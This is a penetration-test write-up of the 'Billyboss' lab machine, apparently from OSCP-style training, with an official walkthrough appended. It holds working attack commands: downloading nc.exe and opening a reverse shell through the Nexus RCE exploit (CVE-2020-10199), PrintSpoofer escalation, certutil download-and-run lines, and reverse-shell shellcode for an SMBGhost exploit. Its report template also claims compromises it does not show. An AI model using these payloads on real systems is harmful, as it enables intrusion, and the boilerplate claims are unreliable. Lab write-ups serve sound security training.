# Billyboss
## Table of Contents
* [Executive Summary](#executive-summary)
  * [Attack Vectors](#attack-vectors)
  * [Recommendations](#recommendations)
* [Methodology](#methodology)
  * [Reconnaissance](#reconnaissance)
  * [Enumeration](#enumeration)
  * [Gaining Access](#gaining-access)
  * [Maintaining Access](#maintaining-access)
  * [Covering Tracks](#covering-tracks)
* [Additional Items](#additional-items)

# Executive Summary
On 1 August 2021, Victor Fernandez III performed a penetration test of the Offensive Security exam network. This report includes detailed information about the vulnerabilities he discovered as well as recommendations for mitigating each of them. This report also contains an outline of the methodolgy he used to enumerate and exploit the THINC.local domain. During the penetration test, Victor was able to gain administrator-level access to multiple computers, primarly due to out-of-date and/or misconfigured software. A brief description of each computer compromised is listed below.

## Attack Vectors
| Vulnerabilities | Exploits |
| --- | ---| 
| CVE-2020-10199 | EDB-ID-49385 |
| CVE-2020-0796 | EDB-ID-48267 |

## Recommendations
Victor recommends patching the vulnerabilities he identified to mitigate the risk of exploitation and/or unauthorized access to Offensive Security information systems. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodology
Victor used a widely-adopted and phased approach for the penetration test. This included reconnaissance, enumeration, gaining access, maintaining access, and covering his tracks. Below is an outline of Victor's activities and serves to demonstrate how he identified and exploited a variety of information systems across the Offensive Security exam network.

## Reconnaissance
The purpose of the reconnaissance phase of a penetration test is to identify information and sytems that represent the organization online and then, discover possible attack vectors. For this penetration test, Victor was asked to narrow his information gathering objectives to collecting the details below. 

### General Information
* Hostname: BILLYBOSS (ref: systeminfo)
* Description: Billyboss will keep your artefacts safe, secure and with a smile.
* IP Address: 192.168.165.61
* MAC Address: 00-50-56-BF-64-4A (ref: getmac) 
* Domain: WORKGROUP
* Distro: Microsoft Windows 10 Pro (ref: systeminfo)
* Kernel: 10.0.18362 N/A Build 18362 (ref: systeminfo)
* Architecture: x64 (ref: systeminfo)

### Ports
```bash
# Nmap 7.91 scan initiated Sat Jul 17 00:40:08 2021 as: nmap -sS -sU -p- --min-rate 1000 -oN scans/billyboss-nmap-complete 192.168.165.61
Nmap scan report for 192.168.165.61
Host is up (0.075s latency).
Not shown: 65535 open|filtered ports, 65532 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
8081/tcp open  blackice-icecap

# Nmap done at Sat Jul 17 00:44:17 2021 -- 1 IP address (1 host up) scanned in 249.02 seconds
```

### Service Versions
```bash
# Nmap 7.91 scan initiated Sat Jul 17 00:46:44 2021 as: nmap -sV -sC -p21,80,8081 -oN scans/billyboss-nmap-versions 192.168.165.61
Nmap scan report for 192.168.165.61
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-cors: HEAD GET POST PUT DELETE TRACE OPTIONS CONNECT PATCH
|_http-server-header: Microsoft-IIS/10.0
|_http-title: BaGet
8081/tcp open  http    Jetty 9.4.18.v20190429
| http-robots.txt: 2 disallowed entries 
|_/repository/ /service/
|_http-server-header: Nexus/3.21.0-05 (OSS)
|_http-title: Nexus Repository Manager
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 17 00:46:54 2021 -- 1 IP address (1 host up) scanned in 10.50 seconds
```

### Operating System
```bash
# Nmap 7.91 scan initiated Sat Jul 17 00:50:51 2021 as: nmap -O -oN scans/billyboss-nmap-os 192.168.165.61
Nmap scan report for 192.168.165.61
Host is up (0.076s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
8081/tcp open  blackice-icecap
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 17 00:51:29 2021 -- 1 IP address (1 host up) scanned in 37.80 seconds
```

## Enumeration
The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

### FTP
Victor was unable to access the FTP service. 

### HTTP
Victor was able to discover the hidden directories below using Dirb.
```bash
dirb http://192.168.165.61:80 /usr/share/wordlists/dirb/big.txt -z10 -o scans/billyboss-dirb-big-80
# output
---- Scanning URL: http://192.168.165.61/ ----
+ http://192.168.165.61/favicon.ico (CODE:200|SIZE:15086)
+ http://192.168.165.61/secci� (CODE:200|SIZE:0)
```

```bash
dirb http://192.168.165.61:8081 /usr/share/wordlists/dirb/big.txt -z10 -o scans/billyboss-dirb-big-8081

# output
---- Scanning URL: http://192.168.165.61:8081/ ----
+ http://192.168.165.61:8081/favicon.ico (CODE:200|SIZE:3774)
+ http://192.168.165.61:8081/robots.txt (CODE:200|SIZE:66)
+ http://192.168.165.61:8081/secci� (CODE:400|SIZE:54)
```

Victor was able to discover the hidden directories below using Dirsearch.
```bash
# Dirsearch started Sat Jul 17 02:02:47 2021 as: dirsearch.py -u 192.168.165.61:80 -o /home/victor/oscp/pg/labs/billyboss/scans/billyboss-dirsearch-80

403   312B   http://192.168.165.61:80/%2e%2e//google.com
404     1KB  http://192.168.165.61:80/+CSCOE+/logon.html#form_title_text
404     1KB  http://192.168.165.61:80/+CSCOE+/session_password.html
404     1KB  http://192.168.165.61:80/.config/psi+/profiles/default/accounts.xml
403   312B   http://192.168.165.61:80/\..\..\..\..\..\..\..\..\..\etc\passwd
404     1KB  http://192.168.165.61:80/bitrix/web.config
404     1KB  http://192.168.165.61:80/cms/Web.config
404     1KB  http://192.168.165.61:80/examples/jsp/%252e%252e/%252e%252e/manager/html/
200    15KB  http://192.168.165.61:80/favicon.ico
404     1KB  http://192.168.165.61:80/lang/web.config
404     1KB  http://192.168.165.61:80/modules/web.config
404     1KB  http://192.168.165.61:80/plugins/web.config
404     1KB  http://192.168.165.61:80/typo3conf/ext/static_info_tables/ext_tables_static+adt-orig.sql
404     1KB  http://192.168.165.61:80/typo3conf/ext/static_info_tables/ext_tables_static+adt.sql
404     1KB  http://192.168.165.61:80/web.config
```

```bash
# Dirsearch started Sat Jul 17 02:02:07 2021 as: dirsearch.py -u 192.168.165.61:8081 -o /home/victor/oscp/pg/labs/billyboss/scans/billyboss-dirsearch-8081

500     2KB  http://192.168.165.61:8081/\..\..\..\..\..\..\..\..\..\etc\passwd
200     4KB  http://192.168.165.61:8081/favicon.ico
302     0B   http://192.168.165.61:8081/index.html    -> REDIRECTS TO: http://192.168.165.61:8081
200    66B   http://192.168.165.61:8081/robots.txt
200     4KB  http://192.168.165.61:8081/swagger-ui
```

Victor was able to identify the following HTTP server misconfigurations using Nikto.
```bash
- Nikto v2.1.6/2.1.5
+ Target Host: 192.168.165.61
+ Target Port: 80
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Retrieved access-control-allow-origin header: *
+ HEAD /61.war: Potentially interesting archive/cert file found.
+ HEAD /61.war: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
+ HEAD /61.tar.gz: Potentially interesting archive/cert file found.
+ HEAD /61.tar.gz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
+ HEAD /192.168.165.61.tar.gz: Potentially interesting archive/cert file found.
+ HEAD /192.168.165.61.tar.gz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
+ HEAD /192168165.tgz: Potentially interesting archive/cert file found.
+ HEAD /192168165.tgz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
+ HEAD /168.egg: Potentially interesting archive/cert file found.
```

## Gaining Access
The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, Victor was able to successfully gain access to 10 out of the 50 systems.

### Password Guessing  
#### Default Credentials
The default credentials did not work, but using the service itself did (nexus:nexus).
```bash
# Sonatype Nexus Repository Manager

# DEFAULT CREDENTIALS
# admin:admin123
# anonymous:anonymous

# WORKING CREDENTIALS
# nexus:nexus
```

### CVE-2020-10199
#### EDB-ID-49385
Downloaded exploit.
```bash
searchsploit nexus manager
mkdir edb-id-49385
cd edb-id-49385
searchsploit -x 49385
```

Modified exploit.
```bash
vim 49385.py
# USERNAME='nexus'
# PASSWORD='nexus'
# CMD='ping.exe 192.168.49.165'
```

Once the possibility of RCE was confirmed, Victor used PowerShell to determine his current working directory as the user 'nexus'.
```bash
vim 49385.py
# CMD='powershell.exe -c "iwr -uri http://192.168.49.165/$pwd" -outfile "C:/Users/nathan/Nexus/nexus-3.21.0-05/pwd.txt"'
```

Next, he used his attack vector to download and then, execute Netcat.
```bash
vim 49385.py
# CMD='powershell.exe -c "iwr -uri http://192.168.49.165/nc.exe" -outfile "C:/Users/nathan/Nexus/nexus-3.21.0-05/nc.exe"'
```

```bash
vim 49385.py
# CMD='cmd.exe /c C:/users/nathan/nexus/nexus-3.21.0-05/nc.exe 192.168.49.165 80 -e "cmd.exe"'
```

## Maintaining Access
Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already per-formed the exploit. Victor added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to en-sure that additional access could be established.

### Privilege Escalation
```bash
# target side
whoami /priv

# output
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone  
```

```bash
# attacker side
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
sudo python3 -m http.server 80
```

```bash
# target side
powershell.exe -c "iwr -uri http://192.168.146.61/PrintSpoofer64.exe -outfile PrintSpoofer64.exe"
PrintSpoofer64.exe -i -c cmd
whoami

# output
nt authority\system
```

## Covering Tracks
The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important. After the trophies on both the lab network and exam network were completed, Victor removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items
## Tools Used
* nmap
* nc
* python3 http.server module
* powershell
* PrintSpoofer64.exe

## Hints
* You have to guess the credentials.
* Have you looked for vulnerabilities for that version?
* Try looking at the installed KBs. This one made the news. 

## Flags
* local.txt = b66202e583d3fb92c79f40caf9b3a5ab
* proof.txt = 330f3c45b65be177fa8cd7ab7c73c093

## Lessons Learned
* Password guessing: when default credentials work, try service:service (nexus:nexus, phpmyadmin:phpmyadmin, etc.).
* file.sln is a solution file and is used to compile code in VisualStudio.
* Replace #include <file.h> with #include "file.h" to force the compiler to look in the current directory for the header file.

## Official Walkthrough
```bash
Exploitation Guide for Billyboss
Summary

We’ll gain a foothold on this machine with some basic password guessing. We’ll then exploit a remote code execution vulnerability in the Sonatype Nexus application installed on this machine. Finally, we’ll exploit the SMBGhost vulnerability to escalate our privileges.
Enumeration
Nmap

We’ll start off with a simple Nmap scan.

kali@kali:~$ sudo nmap 192.168.140.61
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-05 01:33 EST
Nmap scan report for 192.168.140.61
Host is up (0.30s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
8081/tcp open  blackice-icecap

Nmap done: 1 IP address (1 host up) scanned in 32.57 seconds

Sonatype Nexus

Browsing to the website on port 8081, we find an installation of Sonatype Nexus. A quick online search reveals that there are no default credentials we can exploit. However, after a few educated guesses, we log in as nexus:nexus.

According to the information in the top-left corner, the target is running Sonatype Nexus version 3.21.0-05.
Exploitation
Sonatype Nexus Authenticated Code Execution

An EDB search reveals that version 3.21.0-05 of Sonatype Nexus is vulnerable to a remote code execution exploit. To run the exploit, we’ll first generate an MSFVenom reverse shell payload.

kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.118.3 LPORT=8081
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe

We’ll host our payload over HTTP.

kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

Let’s start a Netcat handler on port 8081 to catch our reverse shell.

kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...

We’ll modify the exploit as follows:

URL='http://192.168.140.61:8081'
CMD='cmd.exe /c certutil -urlcache -split -f http://192.168.118.3/shell.exe shell.exe'
USERNAME='nexus'
PASSWORD='nexus'

Next, we’ll run the exploit to download our payload.

kali@kali:~$ python exploit.py 
Logging in
Logged in successfully
Command executed

We’ll make a few more modifications, this time executing our payload.

CMD='cmd.exe /c shell.exe'

Let’s run the exploit again.

kali@kali:~$ python exploit.py 
Logging in
Logged in successfully
Command executed

Finally, we catch our reverse shell as nathan.

kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...
192.168.140.61: inverse host lookup failed: Host name lookup failure
connect to [KALI] from (UNKNOWN) [192.168.140.61] 49883
Microsoft Windows [Version 10.0.18362.719]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\nathan\Nexus\nexus-3.21.0-05>whoami
whoami
billyboss\nathan

Escalation
Installed Patches Enumeration

Listing the installed KBs, we learn that the most recently installed patch is KB4540673. This KB was released in March 2020, which means our target is potentially vulnerable to SMBGhost.

C:\Users\nathan\Nexus\nexus-3.21.0-05>wmic qfe list
wmic qfe list
Caption                                     CSName     Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status  
http://support.microsoft.com/?kbid=4552931  BILLYBOSS  Update                        KB4552931               NT AUTHORITY\SYSTEM  5/26/2020
http://support.microsoft.com/?kbid=4497165  BILLYBOSS  Update                        KB4497165               NT AUTHORITY\SYSTEM  5/26/2020
http://support.microsoft.com/?kbid=4497727  BILLYBOSS  Security Update               KB4497727                                    4/1/2019 
http://support.microsoft.com/?kbid=4537759  BILLYBOSS  Security Update               KB4537759               NT AUTHORITY\SYSTEM  5/26/2020
http://support.microsoft.com/?kbid=4552152  BILLYBOSS  Security Update               KB4552152               NT AUTHORITY\SYSTEM  5/26/2020
http://support.microsoft.com/?kbid=4540673  BILLYBOSS  Update                        KB4540673               BILLYBOSS\nathan     5/27/2020

SMB Settings Enumeration

To further confirm the SMBGhost vulnerability, we check the listening ports and find that port 445 is open.


C:\Users\nathan\Nexus\nexus-3.21.0-05>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1788
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       808
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       996
  TCP    0.0.0.0:8081           0.0.0.0:0              LISTENING       2076
...

SMBGhost Exploitation

We’ll use this exploit against the SMB service. Starting with line 204 in exploit.cpp, we’ll replace the shellcode with a reverse shell.

// Generated with msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.118.3 LPORT=8081 -f dll -f csharp
uint8_t shellcode[] = {
    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
    0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
    0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
    0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
    0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
    0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
    0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
    0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
    0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
    0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
    0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
    0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
    0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
    0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,
    0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x1f,0x91,0xc0,0xa8,0x31,0xb1,0x41,0x54,
    0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,
    0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
    0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,
    0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,
    0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,
    0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
    0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,
    0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,
    0x24,0x54,0x01,0x01,0x48,0x8d,0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,
    0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
    0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,
    0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,0x08,0x87,0x1d,0x60,0xff,
    0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
    0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
    0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5
};

Using Visual Studio (in our case Community 2019 with C++ Desktop Development installed), we’ll set the target to x64 and Release and compile the exploit. We can host the compiled exploit on our attack machine over HTTP and then download it to the target using the low-privileged shell.

C:\Users\nathan\Nexus\nexus-3.21.0-05>certutil -urlcache -split -f http://192.168.118.3/cve-2020-0796-local.exe cve-2020-0796-local.exe
certutil -urlcache -split -f http://KALI/cve-2020-0796-local.exe cve-2020-0796-local.exe
****  Online  ****
  000000  ...
  01e600
CertUtil: -URLCache command completed successfully.

Let’s start a Netcat handler to catch our reverse shell.

kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...

We can now trigger the exploit.

C:\Users\nathan\Nexus\nexus-3.21.0-05>cve-2020-0796-local.exe
cve-2020-0796-local.exe
-= CVE-2020-0796 LPE =-
by @danigargu and @dialluvioso_

Successfully connected socket descriptor: 216
Sending SMB negotiation request...
Finished SMB negotiation
Found kernel token at 0xffffab002ca2c060
Sending compressed buffer...
SEP_TOKEN_PRIVILEGES changed
Injecting shellcode in winlogon...
Success! ;)

Our listener indicates we have obtained a SYSTEM shell.

kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...
192.168.177.61: inverse host lookup failed: Host name lookup failure
connect to [KALI] from (UNKNOWN) [192.168.177.61] 49687
Microsoft Windows [Version 10.0.18362.719]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
